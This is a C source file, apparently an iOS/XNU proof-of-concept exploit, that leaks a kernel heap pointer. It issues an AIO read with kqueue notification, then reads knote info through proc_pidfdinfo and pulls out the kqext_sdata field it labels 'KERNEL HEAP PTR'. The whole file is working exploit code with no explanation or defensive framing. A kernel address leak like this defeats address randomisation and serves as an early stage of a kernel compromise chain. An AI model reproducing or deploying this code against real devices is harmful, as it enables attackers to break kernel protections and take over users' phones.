#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/event.h>
#include <sys/types.h>
#include <signal.h>
#include <pthread.h>

#define SIGEV_KEVENT             3
#define EVFILT_AIO_VAL           ((int16_t)(-3))
#define PROC_PIDFDKQUEUE_EXTINFO 9

extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);

/* full XNU sigevent - iOS SDK only exposes first 5 fields */
struct sigevent_xnu {
    int             sigev_notify;
    int             sigev_signo;
    union sigval    sigev_value;
    void            (*sigev_notify_function)(union sigval);
    pthread_attr_t *sigev_notify_attributes;
    uint32_t        sigev_notify_kevent_flags;
    uint32_t        sigev_notify_port;
    int             sigev_notify_kqueue;
    int             _pad;
    uint64_t        sigev_notify_kevent_id;
};

/* full aiocb with private sigevent */
struct aiocb_xnu {
    int                  aio_fildes;
    int                  _pad0;
    off_t                aio_offset;
    volatile void       *aio_buf;
    size_t               aio_nbytes;
    int                  aio_reqprio;
    int                  _pad1;
    struct sigevent_xnu  aio_sigevent;
    int                  aio_lio_opcode;
    int                  _pad2;
};

/* use dlsym to avoid conflicting with SDK aio_read declaration */
typedef int (*aio_read_fn_t)(void *);
typedef int (*aio_cancel_fn_t)(int, void *);

static aio_read_fn_t   fn_aio_read   = NULL;
static aio_cancel_fn_t fn_aio_cancel = NULL;

static void load_aio_syms(void) {
    void *lib = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY | RTLD_NOLOAD);
    if (!lib) lib = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY);
    if (!lib) return;
    fn_aio_read   = (aio_read_fn_t)  dlsym(lib, "aio_read");
    fn_aio_cancel = (aio_cancel_fn_t)dlsym(lib, "aio_cancel");
}

#define KQEXT_SDATA_OFFSET 72
#define KQEXT_STRIDE       88

static char g_result[512];

uint64_t cve_84530_leak(void) {
    load_aio_syms();
    if (!fn_aio_read) {
        snprintf(g_result, sizeof(g_result), "dlsym(aio_read) failed");
        return 0;
    }

    int fd = open("/dev/null", O_RDONLY);
    if (fd < 0) {
        snprintf(g_result, sizeof(g_result), "open() failed: %d", fd);
        return 0;
    }

    int kq = kqueue();
    if (kq < 0) {
        snprintf(g_result, sizeof(g_result), "kqueue() failed: %d", kq);
        close(fd); return 0;
    }

    struct aiocb_xnu cb;
    static char buf[128];
    memset(&cb, 0, sizeof(cb));
    cb.aio_fildes                         = fd;
    cb.aio_buf                            = buf;
    cb.aio_nbytes                         = 1;
    cb.aio_offset                         = 0;
    cb.aio_sigevent.sigev_notify          = SIGEV_KEVENT;
    cb.aio_sigevent.sigev_notify_kqueue   = kq;
    cb.aio_sigevent.sigev_value.sival_ptr = NULL;

    int ret = fn_aio_read(&cb);
    if (ret != 0) {
        snprintf(g_result, sizeof(g_result),
            "aio_read() failed: %d (sandbox blocks AIO?)", ret);
        close(kq); close(fd); return 0;
    }
    usleep(20000);

    uint8_t extbuf[4096];
    memset(extbuf, 0, sizeof(extbuf));
    int n = proc_pidfdinfo(getpid(), kq, PROC_PIDFDKQUEUE_EXTINFO,
                           extbuf, (int)sizeof(extbuf));
    if (n <= 0) {
        snprintf(g_result, sizeof(g_result),
            "proc_pidfdinfo() failed: %d (sandbox blocks?)", n);
        if (fn_aio_cancel) fn_aio_cancel(fd, &cb);
        close(kq); close(fd); return 0;
    }

    int count = n / KQEXT_STRIDE;
    for (int i = 0; i < count; i++) {
        uint8_t  *entry  = extbuf + i * KQEXT_STRIDE;
        int16_t   filter = *(int16_t  *)(entry + 8);
        int64_t   data   = *(int64_t  *)(entry + 32);
        uint64_t  sdata  = *(uint64_t *)(entry + KQEXT_SDATA_OFFSET);
        if (filter == EVFILT_AIO_VAL) {
            snprintf(g_result, sizeof(g_result),
                "EVFILT_AIO found!\n"
                "kqext_kev.data = 0x%llx (should be 0)\n"
                "kqext_sdata    = 0x%llx  <- KERNEL HEAP PTR\n"
                "Leaked addr:     0x%llx",
                (unsigned long long)data,
                (unsigned long long)sdata,
                (unsigned long long)sdata);
            if (fn_aio_cancel) fn_aio_cancel(fd, &cb);
            close(kq); close(fd);
            return sdata;
        }
    }

    snprintf(g_result, sizeof(g_result),
        "No EVFILT_AIO found - %d knotes scanned", count);
    if (fn_aio_cancel) fn_aio_cancel(fd, &cb);
    close(kq); close(fd);
    return 0;
}

const char *cve_84530_leak_str(void) { return g_result; }
